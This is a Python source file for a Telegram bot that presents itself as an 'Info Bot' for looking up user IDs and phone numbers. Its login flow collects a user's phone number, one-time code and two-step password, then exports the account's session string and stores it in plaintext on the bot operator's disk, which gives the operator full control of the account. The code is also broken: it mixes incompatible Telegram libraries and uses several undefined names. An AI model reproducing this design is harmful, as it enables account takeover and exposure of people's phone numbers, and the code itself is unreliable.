import asyncio
import logging
import os
import random
import string
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, CallbackContext, ConversationHandler, filters
from pyrogram import Client, filters as pyrogram_filters
from pyrogram.errors import ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired
from telethon.errors import SessionPasswordNeededError  # Correct import for session password error
from config import API_ID, API_HASH, BOT_TOKEN  # Import credentials from config.py

# Define conversation states
PHONE = range(1)

# Generate random session name for each user
def generate_random_name(length=7):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# Delete session files for a specific user
async def delete_session_files(user_id):
    session_file = f"session_{user_id}.session"
    memory_file = f"session_{user_id}.session-journal"

    session_file_exists = os.path.exists(session_file)
    memory_file_exists = os.path.exists(memory_file)

    if session_file_exists:
        os.remove(session_file)
    
    if memory_file_exists:
        os.remove(memory_file)

    # Return whether any files were deleted
    return session_file_exists or memory_file_exists

# Save session string in a text file
def save_session_string(user_id, string_session):
    with open(f"session_{user_id}.txt", "w") as f:
        f.write(string_session)

# Read session string from a file
def read_session_string(user_id):
    try:
        with open(f"session_{user_id}.txt", "r") as f:
            return f.read()
    except FileNotFoundError:
        return None

# Define the /logout command to clear session data
async def clear_db(client, message):
    user_id = message.chat.id
    files_deleted = await delete_session_files(user_id)

    if files_deleted:
        await message.reply("✅ Your session data and files have been cleared from memory and disk.")
    else:
        await message.reply("⚠️ You are not logged in, no session data found.")

# Define the /login command
async def generate_session(_, message):
    user_id = message.chat.id
    number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=pyrogram_filters.text)   
    phone_number = number.text
    try:
        await message.reply("📲 Sending OTP...")
        client = Client(f"session_{user_id}", API_ID, API_HASH)
        
        await client.connect()
    except Exception as e:
        await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
    
    try:
        code = await client.send_code(phone_number)
    except ApiIdInvalid:
        await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
        return
    except PhoneNumberInvalid:
        await message.reply('❌ Invalid phone number. Please restart the session.')
        return
    try:
        otp_code = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=pyrogram_filters.text, timeout=600)
    except TimeoutError:
        await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
        return
    phone_code = otp_code.text.replace(" ", "")
    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
                
    except PhoneCodeInvalid:
        await message.reply('❌ Invalid OTP. Please restart the session.')
        return
    except PhoneCodeExpired:
        await message.reply('❌ Expired OTP. Please restart the session.')
        return
    except SessionPasswordNeededError:
        try:
            two_step_msg = await _.ask(user_id, 'Your account has two-step verification enabled. Please enter your password.', filters=pyrogram_filters.text, timeout=300)
        except TimeoutError:
            await message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
            return
        try:
            password = two_step_msg.text
            await client.check_password(password=password)
        except PasswordHashInvalid:
            await two_step_msg.reply('❌ Invalid password. Please restart the session.')
            return
    string_session = await client.export_session_string()
    save_session_string(user_id, string_session)  # Save session string locally
    await client.disconnect()
    await otp_code.reply("✅ Login successful!")

# Define the start and help commands for the bot
def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text(
        "Hey User! 👋\n"
        "Welcome to the Telegram Info Bot.\n\n"
        "Commands you can use:\n"
        "/login - Login to your Telegram account\n"
        "/help - Get more info about bot features 🎉\n\n"
        "Note: \n"
        "I can help you fetch user IDs and mobile numbers after logging in. "
        "You can also check your own information after successful login."
    )

def help_command(update: Update, context: CallbackContext) -> None:
    update.message.reply_text(
        "ℹ️ This bot allows you to access some of your Telegram information.\n\n"
        "⚙️ Available Commands:\n"
        "/start - Start the bot\n"
        "/login - Login to your Telegram account\n"
        "/help - Show this message"
    )

# Handle forwarded messages and retrieve username history
def handle_forwarded_message(update: Update, context: CallbackContext) -> None:
    # Check if the user is logged in
    if not user_logged_in:
        update.message.reply_text(
            "🚫 Pehle login karein! 🔑\n\n"
            "Aapko /login command ka use karke apne Telegram account se connect karna hoga. "
            "Uske baad hi main aapki madad kar sakta hoon. 😊"
        )
        return

    # If message is forwarded, extract sender's info
    if update.message.forward_from:
        forwarded_user = update.message.forward_from
        sender_id = forwarded_user.id
        sender_username = forwarded_user.username if forwarded_user.username else "No username"

        # Check if the sender's history is available
        history = user_history.get(sender_id, None)

        if history:
            update.message.reply_text(f"User {sender_username} has previously logged in with the username: {history}")
        else:
            update.message.reply_text(f"User {sender_username} does not have a previous login history.")

# Unauthorized message handler (before login)
def handle_unauthorized_messages(update: Update, context: CallbackContext) -> None:
    if not user_logged_in:
        update.message.reply_text(
            "🚫 Aapko pehle login karna hoga! 🔑\n\n"
            "Aapko /login command ka use karke apne Telegram account se connect karna hoga. "
            "Uske baad hi main aapki madad kar sakta hoon. 😊"
        )
    else:
        update.message.reply_text(
            "❓ Main samajh nahi paya. Kripya sahi command ka istemal karein.\n\n"
            "Available Commands:\n"
            "/start - Bot ko start karein\n"
            "/help - Madad ke liye\n"
            "/login - Apne Telegram se connect karein"
        )

# Conversation handler
def conversation_handler() -> ConversationHandler:
    return ConversationHandler(
        entry_points=[CommandHandler('login', generate_session)],  # /login command triggers this conversation
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, phone_number)],  # Define your phone input handling here
        },
        fallbacks=[],
    )

# Main function to run the bot
def main():
    # Use your bot's token
    application = Application.builder().token(BOT_TOKEN).build()

    # Enable logging
    logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.DEBUG)

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))

    # Handle login process
    application.add_handler(conversation_handler())

    # Handle messages that are not commands
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_unauthorized_messages))

    # Handle forwarded messages to track username history
    application.add_handler(MessageHandler(filters.FORWARDED, handle_forwarded_message))

    # Start Bot Polling
    application.run_polling()

if __name__ == "__main__":
    main()  # Ensure this function call is properly indented and closed
